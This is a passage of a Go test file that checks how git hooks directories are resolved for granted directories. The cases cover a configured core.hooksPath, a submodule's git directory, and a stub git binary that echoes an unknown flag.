			gitIn(t, x, "config", "core.worktree", mkdirs(t, root, "y")[0])
			gitIn(t, x, "config", "core.hooksPath", "a/hooks")
			return []string{x, filepath.Join(x, ".git", "objects")}
		},
	}
	for name, build := range cases {
		t.Run(name, func(t *testing.T) {
			var grants []string
			for _, g := range build(t, t.TempDir()) {
				grants = append(grants, resolved(g))
			}
			reversed := slices.Clone(grants)
			slices.Reverse(reversed)
			for _, order := range [][]string{grants, reversed} {
				got, unresolved := hookRunnerDirs(order)
				slices.Sort(unresolved)
				want := slices.Sorted(slices.Values(order))
				if len(got) != 0 || !slices.Equal(unresolved, want) {
					t.Errorf("grants %v: hookRunnerDirs = %v, unresolved %v; want no hook directory and every grant unresolved", order, got, unresolved)
				}
			}
		})
	}
}

// With core.hooksPath unset, a git directory's own hooks directory is the answer, and git
// spells it relative to the directory asked from even outside a work tree. Only a
// configured value is the one with nothing to be relative to.
func TestAGrantOnASubmoduleGitDirFindsItsDefaultHooks(t *testing.T) {
	root := t.TempDir()
	up := filepath.Join(root, "up")
	gitIn(t, root, "init", "-q", up)
	gitIn(t, up, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "--allow-empty", "-m", "init")
	m := filepath.Join(root, "m")
	gitIn(t, root, "init", "-q", m)
	gitIn(t, m, "-c", "protocol.file.allow=always", "submodule", "add", "-q", up, "sub")
	gd := resolved(filepath.Join(m, ".git", "modules", "sub"))
	got, unresolved := hookRunnerDirs([]string{gd})
	if want := []string{filepath.Join(gd, "hooks")}; !slices.Equal(got, want) || len(unresolved) != 0 {
		t.Errorf("hookRunnerDirs = %v, unresolved %v; want %v", got, unresolved, want)
	}
}

// A git older than --absolute-git-dir echoes the flag back as a line of its own, which
// passes a line count. The answer must be refused rather than read with the flag as the
// git directory a bare repository's hooks are joined onto.
func TestAGitThatEchoesAnUnknownFlagIsRefused(t *testing.T) {
	shim := t.TempDir()
	if err := os.WriteFile(filepath.Join(shim, "git"), []byte("#!/bin/sh\nprintf 'false\\ntrue\\n--absolute-git-dir\\na/hooks\\n'\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", shim)
	grant := t.TempDir()
	if got, err := hookRunnerDir(grant, []string{resolved(grant)}); err == nil {
		t.Errorf("hookRunnerDir = %q with no error for an answer naming no git directory", got)
	}
}

// mkdirs creates each path under root and returns them absolute.
func mkdirs(t *testing.T, root string, paths ...string) []string {
	t.Helper()
	var out []string
	for _, p := range paths {
		d := filepath.Join(root, p)
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
		out = append(out, d)
	}
	return out
}
